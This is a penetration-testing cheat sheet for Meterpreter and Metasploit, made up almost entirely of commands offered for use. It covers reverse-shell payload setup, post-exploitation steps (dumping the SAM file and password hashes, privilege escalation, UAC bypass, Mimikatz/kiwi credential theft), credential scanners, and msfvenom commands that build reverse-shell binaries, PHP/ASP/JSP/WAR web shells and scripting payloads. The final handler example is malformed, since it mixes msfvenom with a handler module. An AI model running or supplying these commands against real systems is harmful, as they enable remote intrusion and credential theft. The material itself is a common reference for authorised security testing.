# 🐮 Meterpreter Cheat Sheet

#### **Windows reverse meterpreter payload**

* ```
  set payload windows/meterpreter/reverse_tcp
  ```
  * Windows reverse tcp payload

#### **Windows VNC Meterpreter payload** <a href="#toc475369007" id="toc475369007"></a>

* ```
  set payload windows/vncinject/reverse_tcp
  ```
  * Meterpreter Windows VNC Payload
* ```
  set ViewOnly false
  ```

#### **Linux Reverse Meterpreter payload** <a href="#toc475369008" id="toc475369008"></a>

* ```
  set payload linux/meterpreter/reverse_tcp
  ```
  * &#x20;Meterpreter Linux Reverse Payload

#### **Meterpreter Cheat Sheet** <a href="#toc475369009" id="toc475369009"></a>

* ```
  upload file c:\\windows
  ```
  * Meterpreter upload file to Windows target
* ```
  download c:\\windows\\repair\\sam /tmp
  ```
  * Meterpreter download file from Windows target
* ```
  download c:\\windows\\repair\\sam /tmp
  ```
  * Meterpreter download file from Windows target
* ```
  execute -f c:\\windows\temp\exploit.exe
  ```
  * Meterpreter run .exe on target – handy for executing uploaded exploits
* ```
  execute -f cmd -c
  ```
  * Creates new channel with cmd shell
* ```
  ps
  ```
  * Meterpreter show processes
* ```
  shell
  ```
  * Meterpreter get shell on the target
* ```
  getsystem
  ```
  * Meterpreter attempts priviledge escalation the target
* ```
  hashdump
  ```
  * Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)
* ```
  portfwd add –l 3389 –p 3389 –r target
  ```
  * Meterpreter create port forward to target machine
* ```
  portfwd delete –l 3389 –p 3389 –r target
  ```
  * Meterpreter delete port forward
* ```
  use exploit/windows/local/bypassuac
  ```
  * Bypass UAC on Windows 7 + Set target + arch, x86/64
* ```
  use auxiliary/scanner/http/dir_scanner
  ```
  * Metasploit HTTP directory scanner
* ```
  use auxiliary/scanner/http/jboss_vulnscan
  ```
  * Metasploit JBOSS vulnerability scanner
* ```
  use auxiliary/scanner/mssql/mssql_login
  ```
  * Metasploit MSSQL Credential Scanner
* ```
  use auxiliary/scanner/mysql/mysql_version
  ```
  * Metasploit MSSQL Version Scanner
* ```
  use auxiliary/scanner/oracle/oracle_login
  ```
  * Metasploit Oracle Login Module
* ```
  use exploit/multi/script/web_delivery
  ```
  * Metasploit powershell payload delivery module
* ```
  post/windows/manage/powershell/exec_powershell
  ```
  * Metasploit upload and run powershell script through a session
* ```
  use exploit/multi/http/jboss_maindeployer
  ```
  * Metasploit JBOSS deploy
* ```
  use exploit/windows/mssql/mssql_payload
  ```
  * Metasploit MSSQL payload
* ```
  run post/windows/gather/win_privs
  ```
  * Metasploit show privileges of current user
* ```
  use post/windows/gather/credentials/gpp
  ```
  * Metasploit grab GPP saved passwords
* ```
  load kiwi
  ```
* ```
  creds_all
  ```
  * Metasploit load Mimikatz/kiwi and get creds
* ```
  run post/windows/gather/local_admin_search_enum
  ```
  * Idenitfy other machines that the supplied domain user has administrative access to
* ```
  set AUTORUNSCRIPT post/windows/manage/migrate
  ```

#### **Meterpreter Payloads** <a href="#toc475369010" id="toc475369010"></a>

* ```
  msfvenom –l
  ```
  * &#x20;List options

#### **Binaries** <a href="#toc475369011" id="toc475369011"></a>

* ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
  ```
* ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
  ```
* ```
  msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
  ```

#### **Web Payloads** <a href="#toc475369012" id="toc475369012"></a>

* ```
  msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php
  ```
  * PHP
* ```
  set payload php/meterpreter/reverse_tcp           
  ```
  * Listener
* ```
  cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
  ```
  * PHP
* ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
  ```
  * ASP
* ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
  ```
  * JSP
* ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
  ```
  * WAR

#### **Scripting Payloads** <a href="#toc475369013" id="toc475369013"></a>

* `msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py`
  * Python
* ```
  msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
  ```
  * Bash
* ```
  msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
  ```
  * Perl

#### **Shellcode** <a href="#toc475369014" id="toc475369014"></a>

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

* ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
  ```
* ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
  ```
* ```
  msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
  ```

#### **Handlers** <a href="#toc475369015" id="toc475369015"></a>

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

```
exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z
```

An example is:

```
msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
```
